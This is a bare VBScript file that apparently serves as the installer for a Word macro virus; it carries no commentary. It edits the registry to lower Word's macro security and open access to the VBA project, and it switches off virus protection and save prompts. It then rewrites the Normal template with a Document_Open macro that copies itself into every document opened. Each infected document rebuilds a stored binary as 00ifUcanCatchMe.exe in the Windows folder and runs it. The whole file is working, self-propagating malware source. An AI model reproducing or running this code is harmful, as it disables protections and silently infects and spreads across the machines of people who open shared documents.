On Error Resume Next
Set Word = WScript.CreateObject("Word.Application")
Set Shell = CreateObject("WScript.Shell")
Set N = Word.NormalTemplate.VBProject.VBComponents(1).CodeModule
RegPath = "HKCU\Software\Microsoft\Office\" & Word.Application.Version & "\Word\Security\"
Shell.RegWrite RegPath & "Level", 1, "REG_DWORD"
Shell.RegWrite RegPath & "AccessVBOM", 1, "REG_DWORD"
Word.Options.VirusProtection = False
Word.Options.ConfirmConversion = False
Word.Options.SaveNormalPrompt = False
N.DeleteLines 1, N.CountOfLines
N.InsertLines 1, "Private Sub Document_Open()"
N.InsertLines 2, "On Error Resume Next"
N.InsertLines 3, "Dim Tamiami As String"
N.InsertLines 4, "Dim Tam1 As String"
N.InsertLines 5, "Dim Tam2 As String"
N.InsertLines 6, "Dim Tam3 As String"
N.InsertLines 7, "Dim Tam4 As String"
N.InsertLines 8, "Options.VirusProtection = False"
N.InsertLines 9, "Options.SaveNormalPrompt = False"
N.InsertLines 10, "Options.ConfirmConversions = False"
N.InsertLines 11, "Open Environ(""WinDir"") & ""\Tamiami.wrd"" For Binary As #1"
N.InsertLines 12, "Tamiami = Space(LOF(1))"
N.InsertLines 13, "Get #1, , Tamiami"
N.InsertLines 14, "Close #1"
N.InsertLines 15, "Tam1 = Left(Tamiami, 49999)"
N.InsertLines 16, "Tam2 = Mid(Tamiami, 50000, 49999)"
N.InsertLines 17, "Tam3 = Mid(Tamiami, 100000, 49999)"
N.InsertLines 18, "Tam4 = Right(Tamiami, 49999)"
N.InsertLines 19, "ActiveDocument.Variables.Add ""Tamiami1"", Tam1"
N.InsertLines 20, "ActiveDocument.Variables.Add ""Tamiami2"", Tam2"
N.InsertLines 21, "ActiveDocument.Variables.Add ""Tamiami3"", Tam3"
N.InsertLines 22, "ActiveDocument.Variables.Add ""Tamiami4"", Tam4"
N.InsertLines 23, "Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule"
N.InsertLines 24, "A.DeleteLines 1, A.CountOfLines"
N.InsertLines 25, "A.InsertLines 1, ""Private Sub Document_Open()"""
N.InsertLines 26, "A.InsertLines 2, ""On Error Resume Next"""
N.InsertLines 27, "A.InsertLines 3, ""Dim Tamiami As String"""
N.InsertLines 28, "A.InsertLines 4, ""Dim Tam1 As String"""
N.InsertLines 29, "A.InsertLines 5, ""Dim Tam2 As String"""
N.InsertLines 30, "A.InsertLines 6, ""Dim Tam3 As String"""
N.InsertLines 31, "A.InsertLines 7, ""Dim Tam4 As String"""
N.InsertLines 32, "A.InsertLines 8, ""Tam1 = ActiveDocument.Variables(""""Tamiami1"""").Value"""
N.InsertLines 33, "A.InsertLines 9, ""Tam2 = ActiveDocument.Variables(""""Tamiami2"""").Value"""
N.InsertLines 34, "A.InsertLines 10, ""Tam3 = ActiveDocument.Variables(""""Tamiami3"""").Value"""
N.InsertLines 35, "A.InsertLines 11, ""Tam4 = ActiveDocument.Variables(""""Tamiami4"""").Value"""
N.InsertLines 36, "A.InsertLines 12, ""Tamiami = Tam1 + Tam2 + Tam3 + Tam4"""
N.InsertLines 37, "A.InsertLines 13, ""Open Environ(""""WinDir"""") & """"\00ifUcanCatchMe.exe"""" For Binary As #1"""
N.InsertLines 38, "A.InsertLines 14, ""Put #1, , Tamiami"""
N.InsertLines 39, "A.InsertLines 15, ""Close #1"""
N.InsertLines 40, "A.InsertLines 16, ""Shell Environ(""""WinDir"""") & """"\00ifUcanCatchMe.exe"""""
N.InsertLines 41, "A.InsertLines 17, ""End Sub"""
N.InsertLines 42, "If Left(ActiveDocument.Name, 2) = ""Do"" And IsNumeric(Right(ActiveDocument.Name, 1)) = True Then"
N.InsertLines 43, "ActiveDocument.Saved = True"
N.InsertLines 44, "Else"
N.InsertLines 45, "ActiveDocument.SaveAs ActiveDocument.FullName"
N.InsertLines 46, "End If"
N.InsertLines 47, "End Sub"
Word.Quit